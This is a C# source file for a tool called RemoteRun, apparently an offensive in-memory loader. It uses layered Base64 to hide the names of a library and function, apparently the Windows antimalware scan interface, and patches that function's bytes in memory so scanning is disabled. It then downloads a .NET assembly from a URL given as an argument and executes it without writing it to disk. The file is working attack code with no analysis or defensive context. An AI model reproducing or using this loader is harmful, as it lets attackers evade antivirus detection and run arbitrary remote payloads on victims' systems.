// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:rr.exe RemoteRun.cs
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace RemoteRun
{
    public class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string a);

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr a, string b);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr a, UIntPtr b, uint c, out uint d);

        private static string reveal(string b0, string n)
        {
            string bi = b0;
            for (int i = 0; i < n.Length; i++) {
                bi = Encoding.UTF8.GetString(Convert.FromBase64String(bi));
            }
            return bi;
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("hello");
            List<string> pargs = new List<string>(args);
            pargs.RemoveAt(0);
            IntPtr addr = GetProcAddress(// sneaky:
                LoadLibrary(reveal("VjFaamVHVnRSbFJPVjNScFVqTmpPUT09", "bHad")),
                reveal("VlZaamVHVnRSbGRVYlhCYVZucFdSRnBHWkdGaVZuQlpVMVF3UFE9PQ==", "pvnt")
            );

            uint tmp;
            VirtualProtect(addr, (UIntPtr)6, 64, out tmp);
            Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);

            byte[] bs = (new WebClient()).DownloadData(args[0]);
            Assembly.Load(bs).EntryPoint.Invoke(null, new object[] { pargs.ToArray() });
        }
    }
}
